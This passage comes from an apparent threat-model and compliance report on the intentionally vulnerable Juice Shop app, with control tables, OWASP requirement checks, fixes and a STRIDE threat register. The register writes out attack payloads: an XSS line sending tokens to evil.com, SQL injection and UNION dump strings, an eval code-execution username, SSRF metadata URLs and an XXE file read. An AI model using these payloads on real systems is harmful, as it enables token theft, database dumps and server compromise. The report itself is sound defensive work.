| Authorization | Route-level RBAC | [`server.ts:355-381`](vscode://file/home/mrohr/juice-shop/server.ts:355) — `security.isAuthorized()` applied per route | ⚠️ Partial — inconsistent; admin routes at line 604-605 have no auth |
| Authorization | Deny-all for dangerous operations | [`server.ts:365-378`](vscode://file/home/mrohr/juice-shop/server.ts:365) — `security.denyAll()` on DELETE/POST for products, challenges | ✅ Adequate — `denyAll()` correctly rejects these operations |
| Data Protection | Encryption at rest | None found for SQLite file | ❌ Missing — `data/juiceshop.sqlite` unencrypted on disk |
| Data Protection | TLS/HTTPS | Not configured in application | ❌ Missing — plain HTTP; depends on external proxy |
| Data Protection | PII field masking | Not found | ❌ Missing — no masking of password, email, or card data in API responses |
| Secret Management | Environment-based secrets | Not found — all secrets hardcoded | ❌ Missing — RSA key, HMAC key, cookie secret all in source code |
| Secret Management | Secret rotation capability | Not found | ❌ Missing — keys baked into Docker image |
| Frontend Security | Angular output encoding | Default Angular template binding | ⚠️ Partial — overridden by `bypassSecurityTrustHtml()` in about and administration components |
| Frontend Security | Content Security Policy | Not found — `helmet.contentSecurityPolicy()` not called | ❌ Missing — no CSP header set |
| Frontend Security | XSS filter | `// app.use(helmet.xssFilter())` commented out [`server.ts:187`](vscode://file/home/mrohr/juice-shop/server.ts:187) | ❌ Missing — explicitly disabled |
| Output Encoding | Parameterized SQL | Sequelize ORM model methods (most routes) | ⚠️ Partial — two critical routes use raw `sequelize.query()` with string interpolation |
| Output Encoding | HTML sanitization | `sanitize-html` imported in `lib/insecurity.ts` | ⚠️ Partial — library present but `bypassSecurityTrustHtml()` used in frontend |
| Audit & Logging | HTTP access logging | [`server.ts:330-338`](vscode://file/home/mrohr/juice-shop/server.ts:330) — morgan + winston, `logs/audit.json` | ⚠️ Partial — HTTP requests logged; no security event logging (failed auth, permission denied) |
| Audit & Logging | Security event logging | Not found | ❌ Missing — failed logins, IDOR attempts, admin access not logged as security events |
| Infrastructure & Network | Non-root container | [`Dockerfile:34`](vscode://file/home/mrohr/juice-shop/Dockerfile:34) — `USER 65532` | ✅ Adequate — distroless image with non-root UID |
| Infrastructure & Network | CORS | [`server.ts:181-182`](vscode://file/home/mrohr/juice-shop/server.ts:181) — `app.use(cors())` allow-all | ❌ Missing — wildcard CORS; no origin allowlist |
| Infrastructure & Network | Security headers (partial) | [`server.ts:185-188`](vscode://file/home/mrohr/juice-shop/server.ts:185) — `helmet.noSniff()`, `helmet.frameguard()`, `x-powered-by` disabled | ⚠️ Partial — missing CSP, HSTS, Referrer-Policy; XSS filter disabled |
| Infrastructure & Network | HSTS | Not found — no TLS in app | ❌ Missing — no Strict-Transport-Security header |
| Dependency & Supply Chain | Lockfile | `package-lock.json` present | ✅ Adequate — lockfile committed |
| Dependency & Supply Chain | SBOM generation | [`Dockerfile:21-23`](vscode://file/home/mrohr/juice-shop/Dockerfile:21) — CycloneDX SBOM generated at build time | ✅ Adequate — SBOM produced per build |
| Dependency & Supply Chain | Pinned critical deps | `express-jwt@0.1.3`, `jsonwebtoken@0.4.0` (very old) | 🔶 Weak — intentionally old versions for CTF purposes; production risk |
| Security Testing & Pipeline | SAST | [`.github/workflows/codeql-analysis.yml`](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml) — CodeQL `security-extended` on every push | ✅ Adequate — CodeQL configured with extended security queries |
| Security Testing & Pipeline | DAST | [`.github/workflows/zap_scan.yml`](vscode://file/home/mrohr/juice-shop/.github/workflows/zap_scan.yml) — OWASP ZAP automated scan | ✅ Adequate — ZAP DAST in CI pipeline |

---

### 7b. Requirements Compliance

> Requirements source: cached (local appsec-requirements-example.yaml) · 25 requirements checked · Generated: 2026-04-09

| Status | ID | Priority | Requirement | Evidence | Finding |
|--------|----|----------|-------------|----------|---------|
| ❌ | [WEB-001](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | `MUST` | Anti-CSRF protection (SameSite cookies) | [`server.ts:181`](vscode://file/home/mrohr/juice-shop/server.ts:181) | CORS allow-all; no SameSite cookie attribute; no CSRF tokens |
| ❌ | [WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) | `MUST` | No sensitive data in client-side storage | [`frontend/src/app/Services/request.interceptor.ts:13`](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13) | JWT access token stored in `localStorage` |
| ❌ | [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) | `MUST` | Restrictive CORS allowlist | [`server.ts:181-182`](vscode://file/home/mrohr/juice-shop/server.ts:181) | `app.use(cors())` — wildcard allow-all |
| ❌ | [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) | `SHOULD` | Content-Security-Policy header | [`server.ts:187`](vscode://file/home/mrohr/juice-shop/server.ts:187) | CSP not set; `helmet.xssFilter()` commented out |
| ❌ | [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) | `MUST` | HSTS header (min 1 year) | No TLS in application | No HTTPS and no HSTS header anywhere |
| ✅ | [WEB-006](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html) | `MUST` | Mature frontend frameworks, strict TypeScript | `tsconfig.json`, Angular 20 | Angular 20 with TypeScript strict mode; production build configured |
| ❌ | [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | `MUST` | Encode all user-controlled output; no raw innerHTML | [`frontend/src/app/about/about.component.ts:119`](vscode://file/home/mrohr/juice-shop/frontend/src/app/about/about.component.ts:119) | `bypassSecurityTrustHtml()` used with user feedback content |
| ❌ | [WEB-008](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) | `SHOULD` | Referrer-Policy and Permissions-Policy headers | [`server.ts:185-188`](vscode://file/home/mrohr/juice-shop/server.ts:185) | helmet applied minimally; Referrer-Policy and Permissions-Policy absent |
| ❌ | [EH-001](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) | `MUST` | Secure error state; no internal details to clients | [`server.ts:133`](vscode://file/home/mrohr/juice-shop/server.ts:133) | `require('errorhandler')` in dev mode may expose stack traces |
| ❌ | [EH-002](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) | `MUST` | Generic error messages to clients | Multiple routes | `next(error)` forwards raw error objects to Express default handler |
| ⚠️ | [EH-003](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) | `MUST` | Consistent auth/authz failure handling | [`routes/login.ts:52`](vscode://file/home/mrohr/juice-shop/routes/login.ts:52) | Login returns 401 with specific message; timing difference between "user not found" vs "wrong password" |
| ❌ | [HN-001](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) | `MUST` | Disable technology-disclosure headers | [`server.ts:188`](vscode://file/home/mrohr/juice-shop/server.ts:188) | `x-powered-by` disabled; but `Server: nginx` may expose version from upstream |
| ❌ | [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | `MUST` | Management endpoints not on public network | [`server.ts:604-605`](vscode://file/home/mrohr/juice-shop/server.ts:604) | `/rest/admin/*`, `/metrics`, `/api-docs` all publicly accessible |
| ❌ | [HN-003](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | `MUST` | Disable unused features/default accounts before production | `models/user.ts` seed data | Admin account `admin@juice-sh.op` / `admin123` seeded by default |
| ❌ | [HN-004](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | `SHOULD` | WAF in front of internet-facing applications | Not found | No WAF configured or referenced |
| ❌ | [AC-001](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | `MUST` | API-to-API mutual authentication | Not applicable — single service | No service-to-service calls (except Google OAuth); no mTLS |
| ❌ | [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) | `MUST` | Least-privilege RBAC; deny by default | [`server.ts:604-605`](vscode://file/home/mrohr/juice-shop/server.ts:604) | Admin endpoints have no auth; role in JWT payload not re-verified |
| ❌ | [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) | `MUST` | Rate limiting on all externally reachable endpoints | [`server.ts:343,458`](vscode://file/home/mrohr/juice-shop/server.ts:343) | Rate limiting only on `/rest/user/reset-password` and OAuth; `/rest/user/login` unrated |
| ❌ | [AC-004](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) | `MUST` | Central IdP with standard protocol and mandatory MFA | Custom JWT auth | Custom auth implementation; TOTP optional not mandatory; no OIDC |
| ❌ | [AC-005](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) | `MUST` | Validate OAuth token claims (iss, aud, exp) | [`lib/insecurity.ts:54`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:54) | `express-jwt@0.1.3` does not validate `iss`, `aud`, or algorithm |
| ❌ | [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | `MUST` | Resource-level authorization; prevent IDOR | Multiple routes | Basket, order, and user routes accept numeric IDs without ownership check |
| ❌ | [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) | `MUST` | Validate all external input; allowlist | Routes use `req.body` directly | No schema validation; `req.body.*` used directly in SQL and eval |
| ❌ | [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) | `MUST` | Harden XML parsers against XXE | [`server.ts:309`](vscode://file/home/mrohr/juice-shop/server.ts:309) | `libxmljs2` used for XML upload — default config may enable external entity processing |
| ❌ | [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | `MUST` | Parameterized queries; no string concatenation | [`routes/login.ts:34`](vscode://file/home/mrohr/juice-shop/routes/login.ts:34), [`routes/search.ts:23`](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) | Direct string interpolation in SQL in two critical routes |
| ⚠️ | [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | `MUST` | Validate and securely store uploaded files | [`server.ts:309`](vscode://file/home/mrohr/juice-shop/server.ts:309) | File type check present but bypassable (CTF challenge); upload path traversal checks exist |
| ❌ | [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) | `MUST` | Do not store raw credentials; use identity service | [`models/user.ts:77`](vscode://file/home/mrohr/juice-shop/models/user.ts:77) | Passwords hashed with MD5 — not a KDF; no bcrypt/argon2 |
| ❌ | [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) | `MUST` | Secrets in dedicated secret manager | [`lib/insecurity.ts:23,44`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23) | RSA private key and HMAC key hardcoded as string literals |
| ❌ | [DP-006](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html) | `MUST` | All external data over TLS 1.2+ | Application level | Application serves plain HTTP; no TLS configuration |
| ✅ | [SC-004](https://owasp.org/www-project-cyclonedx/) | `SHOULD` | SBOM per release | [`Dockerfile:21-23`](vscode://file/home/mrohr/juice-shop/Dockerfile:21) | CycloneDX SBOM generated during Docker build |
| ✅ | [SC-006](https://owasp.org/www-community/controls/Static_Code_Analysis) | `MUST` | SAST in CI/CD pipeline | [`.github/workflows/codeql-analysis.yml`](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml) | CodeQL with `security-extended` queries on every push |
| ❌ | [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | `MUST` | Log all security-relevant events | [`server.ts:330-338`](vscode://file/home/mrohr/juice-shop/server.ts:330) | HTTP access log only; no security event logging for failed auth, privilege escalation |
| ❌ | [LM-002](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | `MUST` | Structured JSON log format for security events | [`server.ts:333`](vscode://file/home/mrohr/juice-shop/server.ts:333) | `audit.json` file exists for HTTP access log but security events not structured |
| ❌ | [LM-003](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | `MUST` | Centralized tamper-resistant log aggregation | Not found | Logs stored locally; `/support/logs` publicly readable — logs are not tamper-resistant |

**Summary:** 3 ✅ PASS · 2 ⚠️ PARTIAL · 28 ❌ FAIL · 0 ❓ UNVERIFIABLE (33 total)

#### ❌ [WEB-001](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — Anti-CSRF protection

**Attack:** Cross-Site Request Forgery — attacker tricks an authenticated user into triggering state-changing requests (add to basket, submit order, change password) from a malicious page.
**Evidence:** [`server.ts:181-182`](vscode://file/home/mrohr/juice-shop/server.ts:181)
**Effort:** M

**Fix:**
- Add `SameSite=Strict` to the session cookie; configure `csurf` or `csrf-csrf` middleware for state-changing endpoints.
- Before: `res.cookie('token', jwt)` (no SameSite attribute)
- After: `res.cookie('token', jwt, { sameSite: 'strict', httpOnly: true, secure: true })`

#### ❌ [WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) — No sensitive data in client-side storage

**Attack:** XSS payload calls `localStorage.getItem('token')` and exfiltrates the JWT to an attacker-controlled server. Token used to hijack session.
**Evidence:** [`frontend/src/app/Services/request.interceptor.ts:13`](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13)
**Effort:** H

**Fix:** Implement a BFF proxy that stores the JWT server-side and issues a `HttpOnly; Secure; SameSite=Strict` session cookie to the SPA. The SPA never holds the raw JWT.

#### ❌ [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Parameterized queries

**Attack:** SQL Injection — attacker bypasses authentication via `email = ' OR 1=1--` or dumps the full database via UNION injection.
**Evidence:** [`routes/login.ts:34`](vscode://file/home/mrohr/juice-shop/routes/login.ts:34)
**Effort:** M

**Fix:**
- Before (`routes/login.ts:34`): `models.sequelize.query(\`SELECT * FROM Users WHERE email = '${req.body.email}'\`)`
- After: `UserModel.findOne({ where: { email: req.body.email, password: security.hash(req.body.password) } })`

#### ❌ [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Secrets in secret manager

**Attack:** Any developer or attacker with source code access obtains the RSA private key and forges admin JWT tokens. Attacker can also read the HMAC signing key and forge coupon codes or other signed values.
**Evidence:** [`lib/insecurity.ts:23`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23), [`lib/insecurity.ts:44`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44)
**Effort:** H

**Fix:** Load secrets from environment variables or a vault at startup. Remove all hardcoded keys from source. Rotate the RSA key pair immediately.

---

## 8. Threat Register

**Risk Distribution:** Critical: 5 · High: 8 · Medium: 7 · Low: 2 · **Total: 22**
**STRIDE Coverage:** Spoofing: 4 · Tampering: 7 · Repudiation: 2 · Information Disclosure: 5 · Denial of Service: 2 · Elevation of Privilege: 2

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|-----------|--------|------|-------------------|-------------|
| <a id="t-001"></a>T-001 | Express Backend | Spoofing | An attacker with read access to the repository or `/encryptionkeys/jwt.pem` HTTP endpoint crafts a JWT payload with `role: admin` and signs it with the hardcoded RSA private key from `lib/insecurity.ts:23`. The `express-jwt@0.1.3` middleware accepts this token without issuer or audience validation, granting full admin access. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | RS256 JWT validation present; public key used for verification | [M-001](#m-001) |
| <a id="t-002"></a>T-002 | Express Backend | Information Disclosure | The JWT RSA private key is served at `GET /encryptionkeys/jwt.pem` with no authentication (`server.ts:277-278`). Any unauthenticated HTTP client can download the key. Once obtained, the attacker uses it to forge tokens (T-001). | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | None — static file serving with no auth | [M-002](#m-002) |
| <a id="t-003"></a>T-003 | Express Backend (Login Route) | Tampering | The login route at `routes/login.ts:34` constructs a SQL query via string interpolation: `SELECT * FROM Users WHERE email = '${req.body.email}'`. An attacker submits `email = ' OR 1=1--` to log in as the first database user (admin) without credentials, or uses UNION-based injection to extract all user hashes, TOTP secrets, and card data. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | None — raw SQL string interpolation | [M-003](#m-003) |
| <a id="t-004"></a>T-004 | Express Backend (Search Route) | Tampering | The search route at `routes/search.ts:23` constructs `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'` from `req.query.q`. Attacker appends `%')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL FROM Users--` to dump all user records via a GET request with no authentication required. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | None — raw SQL string interpolation | [M-003](#m-003) |
| <a id="t-005"></a>T-005 | Angular SPA | Information Disclosure | The JWT access token is stored in `localStorage` (`request.interceptor.ts:13`). The stored XSS vulnerability (T-006) or any future XSS allows an attacker's injected script to call `localStorage.getItem('token')` and exfiltrate the token to a remote server. The token grants 6-hour session access. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | 6-hour token expiry; no refresh token mechanism | [M-004](#m-004) |
| <a id="t-006"></a>T-006 | Angular SPA + Express Backend | Tampering | An attacker posts a feedback comment containing `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('token'))">`. The feedback is stored in SQLite. When any user (including admin) views `/about`, `about.component.ts:119` calls `sanitizer.bypassSecurityTrustHtml(comment)`, executing the payload and exfiltrating all viewers' JWT tokens. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Angular's DomSanitizer present but explicitly bypassed | [M-005](#m-005) |
| <a id="t-007"></a>T-007 | Express Backend (OAuth) | Spoofing | The Google OAuth callback at `routes/oauth2/googleCallback` does not validate the `state` parameter against a stored CSRF token. An attacker can craft a malicious link that triggers OAuth login with an attacker-controlled code, linking the victim's account to the attacker's Google account (OAuth CSRF / account takeover). | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Explicit redirect URI registration (positive) | [M-006](#m-006) |
| <a id="t-008"></a>T-008 | Express Backend (OAuth) | Information Disclosure | The Google OAuth flow passes the `access_token` as a URL query parameter to the Google userinfo endpoint (`user.service.ts:68`): `GET .../userinfo?access_token=TOKEN`. The token appears in Express access logs, server-side proxy logs, and Referer headers, making it accessible to log readers or the publicly browsable `/support/logs` endpoint. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Token short-lived (Google access tokens ~1h) | [M-007](#m-007) |
| <a id="t-009"></a>T-009 | Express Backend (B2B Orders) | Elevation of Privilege | `routes/b2bOrder.ts:23` executes `vm.runInContext('safeEval(orderLinesData)', sandbox)` where `orderLinesData` is sourced from `req.body`. The `notevil` sandbox is documented as bypassable. An authenticated attacker sends a crafted order payload to achieve server-side code execution with the application's process privileges (file read/write, network access). | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Requires authentication; `notevil` sandbox (weak) | [M-008](#m-008) |
| <a id="t-010"></a>T-010 | Express Backend (User Profile) | Elevation of Privilege | `routes/userProfile.ts:62` matches the pattern `#{(.*)}` in the username field and calls `eval(code)` on the capture group. An authenticated user who sets their username to `#{require('child_process').execSync('id')}` triggers server-side code execution. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Requires authentication | [M-008](#m-008) |
| <a id="t-011"></a>T-011 | SQLite Database | Information Disclosure | All user passwords are stored as unsalted MD5 hashes (`models/user.ts:77` → `security.hash()` → `crypto.createHash('md5')`). An attacker who exploits T-003 or T-004 to dump the Users table can crack all hashes using rainbow tables or GPU-accelerated tools within hours. TOTP secrets are also stored in plaintext in the `totpSecret` column. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | None — MD5 is not a KDF | [M-009](#m-009) |
| <a id="t-012"></a>T-012 | Express Backend (Profile Image) | Information Disclosure | `routes/profileImageUrlUpload.ts:24` performs `fetch(req.body.imageUrl)` where the URL is fully attacker-controlled. An authenticated attacker sends `imageUrl: "http://169.254.169.254/latest/meta-data/"` (AWS IMDSv1) or `imageUrl: "http://localhost:3000/rest/admin/application-configuration"` to read internal services unreachable from the public internet. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Requires authentication | [M-010](#m-010) |
| <a id="t-013"></a>T-013 | Express Backend (File Upload) | Tampering | The file upload at `server.ts:309` uses `libxmljs2` to parse XML uploads. If external entity resolution is not explicitly disabled, an attacker uploads an XML file containing `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` to read arbitrary server-side files. The `/encryptionkeys/jwt.pem` file is an obvious target. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Partial file type checking | [M-011](#m-011) |
| <a id="t-014"></a>T-014 | Express Backend (Static Serving) | Information Disclosure | Three directories are publicly served with no authentication: `/ftp/` (`server.ts:269`), `/support/logs/` (`server.ts:281`), and `/encryptionkeys/` (`server.ts:277`). The FTP directory contains sensitive challenge files; the log directory exposes HTTP access logs including user emails and tokens; the encryption key directory exposes the JWT private key. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | None — publicly accessible | [M-002](#m-002) |
| <a id="t-015"></a>T-015 | Express Backend (Admin Routes) | Information Disclosure | `GET /rest/admin/application-configuration` and `GET /rest/admin/application-version` have no authentication middleware (`server.ts:604-605`). These return the full application configuration including Google OAuth client ID, feature flags, and version information, enabling targeted attacks based on known configuration vulnerabilities. | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | None — no auth middleware | [M-012](#m-012) |
| <a id="t-016"></a>T-016 | Express Backend (Metrics/Docs) | Information Disclosure | Prometheus metrics at `/metrics` expose internal performance counters, route hit counts, file upload counts, and potentially challenge solve rates. Swagger UI at `/api-docs` documents all 50+ API endpoints including B2B and admin routes. Combined, these provide an attacker with a full attack surface map without authentication. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Intentional CTF design | [M-012](#m-012) |
| <a id="t-017"></a>T-017 | Socket.IO / WebSocket | Denial of Service | The Socket.IO endpoint at `/socket.io` accepts WebSocket connections. Without rate limiting or connection throttling specific to WebSocket upgrade requests, an attacker can open thousands of WebSocket connections, exhausting file descriptor limits or memory in the Node.js process, causing denial of service for all users. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | None found for WebSocket connections | [M-013](#m-013) |
| <a id="t-018"></a>T-018 | Express Backend (Users/Baskets) | Tampering | The basket and order routes accept numeric resource IDs from the authenticated user (e.g. `GET /api/Baskets/:id`, `GET /rest/basket/:id`). There is no ownership verification — a user who knows or guesses another user's basket ID can view and modify it. The IDs are sequential integers (SQLite autoincrement), making enumeration trivial. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Auth required for basket routes | [M-014](#m-014) |
| <a id="t-019"></a>T-019 | Express Backend (Auth) | Repudiation | Failed login attempts, SQL injection attempts, and admin route access are not logged as security events. Only HTTP access logs are produced (`server.ts:330-338`). An attacker can conduct brute-force, injection, and reconnaissance attacks without generating any security alert or audit trail, making post-incident investigation impossible. | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | HTTP access log (morgan) present; no security event log | [M-015](#m-015) |
| <a id="t-020"></a>T-020 | Express Backend | Repudiation | The application log files are stored at `logs/` and served publicly at `/support/logs/` without authentication. An attacker who has compromised the system can read, download, and confirm their own actions are not being detected. Additionally, a sufficiently privileged attacker could overwrite log files (if write permission exists) to destroy forensic evidence. | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Logs written via morgan | [M-015](#m-015) |
| <a id="t-021"></a>T-021 | Express Backend | Denial of Service | The login endpoint at `POST /rest/user/login` has no rate limiting (`server.ts:343` rate limits only the reset-password endpoint). An attacker can make unlimited login attempts for credential brute-force or to exhaust bcrypt computation (if bcrypt were used) or MD5 computation (trivial, but server-side DB queries create load). | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | None on login endpoint | [M-013](#m-013) |
